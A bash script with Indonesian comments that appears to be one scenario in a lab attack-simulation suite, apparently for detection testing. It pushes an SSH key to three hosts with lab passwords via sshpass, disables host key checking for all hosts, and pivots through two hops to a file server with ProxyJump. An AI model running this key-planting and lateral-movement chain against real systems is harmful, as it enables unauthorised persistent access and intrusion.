#!/usr/bin/env bash
# S08 — SSH lateral movement chain 2+ hop. Kategori: Backdoor/Lateral Movement.
# Jalur: attacker -> client-1 -> client-2 -> srv-file (source IP berubah tiap hop).
# Fase: LINUX (client-1 & client-2 nyala). Butuh sshpass di attacker (sekali, untuk
# push key); hop berikutnya auth berbasis key via ProxyJump.
SCN=S08; ATTACK_CAT=Backdoor; PHASE=linux
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool ssh; need_tool sshpass; need_tool ssh-keygen
banner
for h in "$CLIENT1" "$CLIENT2" "$SRV_FILE"; do ensure_up "$h"; done

KEY="$HOME/.ssh/s08_lab"
O="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8"
[ -f "$KEY" ] || ssh-keygen -t ed25519 -N '' -f "$KEY" -q

echo "== push key ke tiap hop (auth password lab via sshpass) =="
for h in "$CLIENT1" "$CLIENT2" "$SRV_FILE"; do
  sshpass -p "$LIN_PASS" ssh-copy-id -i "$KEY.pub" $O "$LIN_USER@$h" >/dev/null 2>&1 \
    || die "Gagal push key ke $h (cek kredensial lab / host nyala)."
done

# ssh-config sementara: blok 'Host *' -> opsi no-host-key berlaku ke SEMUA host
# TERMASUK jump host (c1,c2). Ini perbaikan gotcha ProxyJump (opsi -o command-line
# tidak merambat ke jump host di banyak versi OpenSSH -> "Host key verification failed").
CFG="$(mktemp)"; trap 'rm -f "$CFG"' EXIT
cat > "$CFG" <<EOF
Host *
  StrictHostKeyChecking no
  UserKnownHostsFile /dev/null
  ConnectTimeout 8
  IdentitiesOnly yes
  IdentityFile $KEY
  User $LIN_USER
EOF

mark_start "chain:$CLIENT1->$CLIENT2->$SRV_FILE"
echo "== chain via ProxyJump (tiap leg berasal dari hop sebelumnya) =="
ssh -F "$CFG" -o ProxyJump="$LIN_USER@$CLIENT1,$LIN_USER@$CLIENT2" "$LIN_USER@$SRV_FILE" \
  'echo "HOP-FINAL di $(hostname) sebagai $(whoami); uname -a"' | tee "$HERE/s08-chain.out"
rc=${PIPESTATUS[0]}
mark_end "chain:$CLIENT1->$CLIENT2->$SRV_FILE"
if [ "$rc" = 0 ] && grep -q HOP-FINAL "$HERE/s08-chain.out"; then
  echo "S08-OK (chain attacker->c1->c2->srv-file berhasil)"
else
  echo "S08-FAIL rc=$rc (chain tak selesai — cek s08-chain.out)"; exit 1
fi
